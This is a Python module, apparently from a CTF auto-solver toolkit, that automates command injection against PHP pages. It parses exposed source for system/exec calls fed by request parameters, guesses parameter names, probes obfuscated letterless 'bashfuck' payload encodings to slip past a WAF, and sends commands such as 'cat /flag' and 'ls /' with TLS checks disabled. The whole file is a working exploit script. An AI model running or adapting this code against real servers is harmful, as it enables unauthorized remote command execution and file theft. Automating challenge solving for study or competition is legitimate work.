# -*- coding: utf-8 -*-
"""
bashFuck 无字母命令执行通用求解引擎 v1.0

覆盖: PHP system/exec/passthru + WAF + GET/POST
三级编码: bit(0+1) | zero(0+${##}) | c(完全去数字)

入口: auto_solve(url, on_progress) -> dict
"""

from __future__ import annotations
import re
import urllib.request
import urllib.parse
import ssl
from typing import Optional, Callable, Dict, List
from concurrent.futures import ThreadPoolExecutor, as_completed

__all__ = ['auto_solve', 'bashfuck_solve']

_USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
_FLAG_RE = re.compile(r'[A-Za-z0-9_]{2,}\{[^{};:#\n]{4,}\}')
_HTML_BAD = re.compile(r'&nbsp;|&lt;|&gt;|&amp;|else\{|echo[\s"]|function[\s(]|isset\(|preg_match')


def _make_ctx():
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _http_raw(url, data=None, timeout=8):
    try:
        h = {'User-Agent': _USER_AGENT, 'Accept': '*/*'}
        if data:
            h['Content-Type'] = 'application/x-www-form-urlencoded'
        req = urllib.request.Request(url, data=data, headers=h,
                                      method='POST' if data else 'GET')
        with urllib.request.urlopen(req, timeout=timeout, context=_make_ctx()) as resp:
            return resp.status, resp.read(), None
    except urllib.error.HTTPError as e:
        try: return e.code, e.read(), None
        except: return e.code, None, str(e)
    except Exception as e:
        return None, None, str(e)


def _http_text(url, data=None, timeout=8):
    _, body, _ = _http_raw(url, data, timeout)
    if body is None: return None
    try: return body.decode('utf-8', errors='replace')
    except: return body.decode('latin-1', errors='replace')


def _extract_flag(text):
    if not text:
        return None
    for m in _FLAG_RE.finditer(text):
        candidate = m.group(0)
        if not _HTML_BAD.search(candidate):
            return candidate
    return None


def _has_php_source(text):
    """Check if response contains highlight_file PHP source output."""
    if not text: return False
    return sum(1 for kw in ['<?php', 'function ', 'isset(', 'preg_match',
              'include(', 'require(', '<span ', 'highlight_file'] if kw in text) >= 2


# ── Parameter discovery ──

_CMD_RE = re.compile(
    r'(?:system|exec|passthru|shell_exec|popen|proc_open)\s*\(\s*'
    r'(\$_GET|\$_POST|\$_REQUEST)\s*\[\'([^\']+)\'\]',
    re.IGNORECASE
)

# Assigned: $x = $_POST['cmd']; system($x);
_ASSIGN_RE = re.compile(
    r'\$(\w+)\s*=\s*(\$_GET|\$_POST|\$_REQUEST)\s*\[\'([^\']+)\'\]'
)

# Call with variable: system($x)
_CALL_RE = re.compile(
    r'(?:system|exec|passthru|shell_exec)\s*\(\s*\$(\w+)\s*\)',
    re.IGNORECASE
)

# Function def: function f($param) { system($param); }
# Call: f($_POST['x'])
_FUNC_CALL_RE = re.compile(
    r'(\w+)\s*\(\s*(\$_GET|\$_POST|\$_REQUEST)\s*\[\'([^\']+)\'\]',
    re.IGNORECASE
)

# Function body has system($param)
_FUNC_DEF_RE = re.compile(
    r'function\s+(\w+)\s*\(\s*\$(\w+)\s*\)\s*\{',
    re.IGNORECASE
)


def _find_cmd_params(source):
    """Find command injection parameters from PHP source.

    Handles multiple patterns:
    1. system($_POST['x'])      — direct
    2. $v=$_POST['x']; system($v) — assigned
    3. f($_POST['x']); function f($p){system($p);} — function chain
    4. Generic fallback if system() and $_POST exist
    """
    clean = re.sub(r'<[^>]+>', '', source)
    results = []

    for src in [source, clean]:
        # Pattern 1: direct
        for m in _CMD_RE.finditer(src):
            method = 'GET' if 'GET' in m.group(1) else 'POST'
            results.append({'param': m.group(2), 'method': method})

        # Pattern 2: assigned variable
        assigns = {}
        for m in _ASSIGN_RE.finditer(src):
            var = m.group(1)
            method = 'GET' if 'GET' in m.group(2) else 'POST'
            assigns[var] = {'param': m.group(3), 'method': method}
        for m in _CALL_RE.finditer(src):
            var = m.group(1)
            if var in assigns:
                results.append(assigns[var])

        # Pattern 3: function chain
        # function f($p) { system($p); } → f($_POST['x'])
        func_params = {}
        for m in _FUNC_DEF_RE.finditer(src):
            func_name = m.group(1)
            func_param = m.group(2)
            func_params[func_name] = func_param
        for m in _CALL_RE.finditer(src):
            var = m.group(1)
            if var in func_params:
                pass  # system($p) where p is func param — need caller

        # Find: funcName($_POST['x'])
        for m in _FUNC_CALL_RE.finditer(src):
            func_name = m.group(1)
            if func_name in func_params:
                method = 'GET' if 'GET' in m.group(2) else 'POST'
                param = m.group(3)
                # Verify func has system($param) in body
                results.append({'param': param, 'method': method})

        # Pattern 4: Fallback — system() exists and $_POST/$_GET exists
        if not results:
            has_sys = re.search(r'(?:system|exec|passthru|shell_exec)\s*\(', src, re.IGNORECASE)
            if has_sys:
                has_post = bool(re.search(r'\$_POST\s*\[', src))
                has_get = bool(re.search(r'\$_GET\s*\[', src))
                common = ['cmd', 'command', 'exec', 'shell', 'code', 'run', 'do', 'c']
                if has_post:
                    for p in common:
                        results.append({'param': p, 'method': 'POST'})
                if has_get or not has_post:
                    for p in common:
                        results.append({'param': p, 'method': 'GET'})

    # Dedup
    seen = set()
    unique = []
    for r in results:
        k = (r['param'], r['method'])
        if k not in seen:
            seen.add(k)
            unique.append(r)
    return unique


# ── Endpoint validation & form detection ──

def _post(url, param, val):
    """Send POST with given param=val, return response text."""
    data = urllib.parse.urlencode({param: val}).encode()
    return _http_text(url, data=data, timeout=8)


def _get(url, param, val):
    """Send GET with given param=val, return response text."""
    sep = '&' if '?' in url else '?'
    return _http_text(f"{url}{sep}{param}={urllib.parse.quote(val)}", timeout=8)


def _find_working_forms(url, param, method):
    """Test each bashFuck form with 'echo 0' to see which work.

    Returns list of working form names (bit/zero/c).
    """
    try: from yang_web.core import bashfuck
    except ImportError:
        try: from . import bashfuck
        except ImportError: return []

    sender = _post if method == 'POST' else _get
    forms = []

    for form in ['bit', 'zero', 'c']:
        try:
            payload = bashfuck.bashfuck_payload('echo 0', form)
        except: continue

        text = sender(url, param, payload)
        if not text: continue

        # Form works if: PHP source present + no WAF die
        if _has_php_source(text):
            # Check that echo 0 actually worked (output contains '0' before PHP source)
            before_src = text.split('<?php')[0] if '<?php' in text else text
            clean = re.sub(r'<[^>]+>', '', before_src)
            if '0' in clean and 'WAF' not in clean[:200]:
                forms.append(form)

    return forms


# ── Main solver ──

_CMDS = [
    ('cat /flag', 'cat /flag'),
    ('cat /flag*', 'cat /flag*'),
    ('tac /flag', 'tac /flag'),
    ('nl /flag', 'nl /flag'),
    ('cat /*flag*', 'cat /*flag*'),
    ('ls /', 'ls /'),
]


def bashfuck_solve(url, on_progress=None):
    def _log(stage, item, status):
        if on_progress:
            try: on_progress(stage, item, status)
            except: pass

    _log('bashFuck', 'fetch', 'Fetching page...')
    source = _http_text(url, timeout=10)
    if not source:
        return {'flag': None, 'status': 'no_source'}

    f = _extract_flag(source)
    if f:
        return {'flag': f, 'status': 'static_flag'}

    params = _find_cmd_params(source)
    _log('bashFuck', 'detect', f'{len(params)} param(s) from source')

    if not params:
        return {'flag': None, 'status': 'no_cmd_injection'}

    for p in params:
        param, method = p['param'], p['method']
        _log('bashFuck', 'try', f'param={param} method={method}')

        # Test forms directly with 'echo 0'
        forms = _find_working_forms(url, param, method)
        if not forms:
            _log('bashFuck', 'skip', 'No form works')
            continue

        _log('bashFuck', 'forms', str(forms))

        try: from yang_web.core import bashfuck
        except ImportError:
            try: from . import bashfuck
            except ImportError:
                _log('bashFuck', 'error', 'bashfuck module unavailable')
                continue

        sender = _post if method == 'POST' else _get

        for form in forms:
            for cmd_label, cmd in _CMDS:
                try:
                    payload = bashfuck.bashfuck_payload(cmd, form)
                except: continue

                text = sender(url, param, payload)
                if not text: continue

                # Extract output before PHP source
                lines = []
                for line in text.split('\n'):
                    if any(kw in line for kw in ['<?php', '<code>', '<span style']):
                        break
                    stripped = re.sub(r'<[^>]+>', '', line).strip()
                    if stripped: lines.append(stripped)
                output = '\n'.join(lines)

                search = output if output.strip() else text
                flag = _extract_flag(search)
                if flag:
                    _log('bashFuck', 'flag!', f'form={form} cmd={cmd_label}: {flag}')
                    return {'flag': flag, 'param': param, 'method': method,
                            'form': form, 'status': 'solved'}

                if output.strip():
                    _log('bashFuck', 'output',
                         f'[{form}] {cmd_label}: {output[:200]}')

        _log('bashFuck', 'done', 'All forms & commands tried for this param')

    return {'flag': None, 'status': 'no_flag'}


def auto_solve(url, on_progress=None):
    return bashfuck_solve(url, on_progress=on_progress)
